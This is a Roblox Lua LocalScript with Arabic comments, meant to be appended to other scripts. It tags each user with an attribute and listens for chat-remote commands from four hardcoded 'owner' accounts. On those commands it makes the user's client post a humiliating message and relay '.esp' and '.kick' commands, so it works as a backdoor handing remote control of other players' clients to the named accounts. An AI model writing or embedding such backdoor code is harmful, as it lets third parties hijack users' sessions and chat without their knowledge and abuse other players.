--// حط هذا الكود في آخر أي سكربت عندك (LocalScript)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local pgui = player:WaitForChild("PlayerGui")

-- علامة إنك تستخدم السكربت
player:SetAttribute("ScriptUser", true)

-- الأونرات الحقيقيين (هم بس اللي أوامرهم تُنفذ فوراً)
local Owners = {
    ["1il5i"] = true,
    ["eyad51533"] = true,
    ["awr_9351156"] = true,
    ["sj3zx"] = true,
}

-- الريموت الصحيح اللي نراقبه
local ChattedEvent = ReplicatedStorage:WaitForChild("Events"):WaitForChild("ChattedEvent")

-- دالة البحث عن لاعب (من حرفين فأكثر - اسم أو لقب)
local function findTarget(partial)
    if not partial or #partial < 2 then return nil end
    partial = partial:lower()
    for _, p in Players:GetPlayers() do
        if p:GetAttribute("ScriptUser") and (p.Name:lower():find(partial) or p.DisplayName:lower():find(partial)) then
            return p
        end
    end
    return nil
end

-- رسالة "السكربت شغال" وسط الشاشة 5 ثواني
local gui = Instance.new("ScreenGui", pgui)
gui.ResetOnSpawn = false
local label = Instance.new("TextLabel", gui)
label.Size = UDim2.new(0, 700, 0, 100)
label.Position = UDim2.new(0.5, -350, 0.4, -50)
label.BackgroundTransparency = 0.4
label.BackgroundColor3 = Color3.new(0,0,0)
label.TextColor3 = Color3.new(1, 0, 0)
label.TextStrokeTransparency = 0
label.Font = Enum.Font.GothamBlack
label.TextSize = 50
label.Text = "سكربت الأونرات مفعّل بالكامل ☠️"
task.delay(5, function() gui:Destroy() end)

-- المراقبة الحقيقية للريموت الصحيح
ChattedEvent.OnClientEvent:Connect(function(senderPlayer, command)
    -- التأكد إن المرسل من الأونرات
    if not senderPlayer or not senderPlayer:IsA("Player") or not Owners[senderPlayer.Name] then
        return
    end

    if typeof(command) ~= "string" then return end
    local msg = command:lower()

    -- .3mk all → الكل يرسل الزحف
    if msg == ".3mk all" then
        game.ReplicatedStorage.Events.SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحًفُفُ 🥺")

    -- .3mk [اسم جزئي] → لاعب واحد بس
    elseif msg:sub(1,5) == ".3mk " then
        local targetName = command:sub(6)
        local target = findTarget(targetName)
        if target then
            game.ReplicatedStorage.Events.SendMessage:FireServer(".3mk " .. target.DisplayName)
            task.wait(0.1)
            game.ReplicatedStorage.Events.SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحًفُفُ 🥺")
        end

    -- .esp all
    elseif msg == ".esp all" then
        game.ReplicatedStorage.Events.SendMessage:FireServer(".esp all")

    -- .unesp all
    elseif msg == ".unesp all" then
        game.ReplicatedStorage.Events.SendMessage:FireServer(".unesp all")

    -- .kick all [سبب]
    elseif msg:sub(1,6) == ".kick " then
        local rest = command:sub(7)
        local targetPart, reason = rest:match("^(.-)%s+(.+)$")
        if not targetPart then targetPart = rest; reason = "عمكم انا" end

        if targetPart:lower() == "all" then
            game.ReplicatedStorage.Events.SendMessage:FireServer(".kick all " .. reason)
        else
            local target = findTarget(targetPart)
            if target then
                game.ReplicatedStorage.Events.SendMessage:FireServer(".kick " .. target.DisplayName .. " " .. reason)
            end
        end
    end
end)

print("مراقبة ChattedEvent شغالة 100% - أوامر الأونرات تُنفذ فوراً من الريموت!")
